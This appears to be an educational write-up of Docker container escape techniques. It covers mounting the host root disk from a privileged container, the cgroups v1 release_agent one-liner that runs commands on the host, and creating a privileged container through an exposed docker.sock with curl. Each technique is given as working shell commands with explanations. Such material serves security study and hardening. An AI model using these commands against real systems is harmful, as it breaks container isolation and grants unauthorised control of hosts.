# Privilege Container

From the description of Docker [--privileged flag](https://docs.docker.com/engine/reference/commandline/run/#full-container-capabilities---privileged), it gives all capabilities to the container, and it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can then do almost everything that the host can do. This flag exists to allow special use-cases, like running Docker within Docker.
Example: `docker run --privileged --name privilege_container -it ubuntu`

## 1. Mount Root

1. We can get the major and minor number of block device:

    ```bash
    #!/bin/bash
    ls -alF /sys/dev/block/ | grep sda1
    ## lrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -> ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/
    ```

    The **major number** identifies the driver associated with the device. The kernel uses the major number at open time to dispatch execution to the appropriate driver.

    The **minor number** is used only by the driver specified by the major number; other parts of the kernel don’t use it, and merely pass it along to the driver. It is common for a driver to control several devices (as shown in the listing); the minor number provides a way for the driver to differentiate among them.
2. If `/dev/sda1` is not existed, we can use `mknod` to generate block special file.

    ```bash
    #!/bin/bash
    mknod /dev/myroot b 8 1
    ```

3. Create a new folder and mount to block special file.

    ```bash
    #!/bin/bash
    # If sda1 isn't existed
    mkdir rootfs; mount /dev/myroot rootfs
    # Else 
    mkdir rootfs; mount /dev/sda1 rootfs
    ```

4. Create a file in `myroot` folder and compare with the root directory in host machine

    Docker:

    ```bash
    #!/bin/bash
    echo hello, host! > rootfs/hello
    ```

    Host:

    ```bash
    #!/bin/bash
    cat /hello
    ```

## 2. Cgroups v1 release notification

An quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature from [Felix Wilhelm](https://twitter.com/_fel1x/status/1151487051986087936) and [detail](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

``` bash
#!/bin/bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

### 2.1 Explanation

- `d`:

A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty. A cgroup is considered to be empty when it contains no child cgroups and no member processes.

- `mkdir -p $d/w;echo 1 >$d/w/notify_on_release`:

The folder w in Cgroups will create a new group and then start the notify_on_release

- `` t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` ``:

Identifies the host path of files within a container by parsing the container root mount point, and extracting the upperdir mount option.

- `` touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o ``:

Finally, we can execute the attack by spawning a process that immediately ends inside the “w” child cgroup. By creating a /bin/sh process and writing its PID to the cgroup.procs file in “w” child cgroup directory, the script on the host will execute after /bin/sh exits

### 2.2 Example

1. Follow the installation in `example/cgroup`, and run the container.

2. Run:

    ``` bash
    #!/bin/bash
    # See the permission
    ./exp.sh ps
    ./exp.sh id
    ```

## 3. Expose docker.sock

By default, a unix domain socket (or IPC socket) is created at /var/run/docker.sock, requiring either root permission, or docker group membership.

1. Expose docker.sock `docker run -v /var/run/docker.sock:/var/run/docker.sock`

2. Using `curl` to control `docker.sock`

```bash
#!/bin/bash
curl -X POST --unix-socket /var/run/docker.sock -d '{"Image":"ubuntu", "Privileged":true}' -H 'Content-Type: application/json' http://localhost/containers/create
# {"Id":"8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a","Warnings":[]}
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start
```
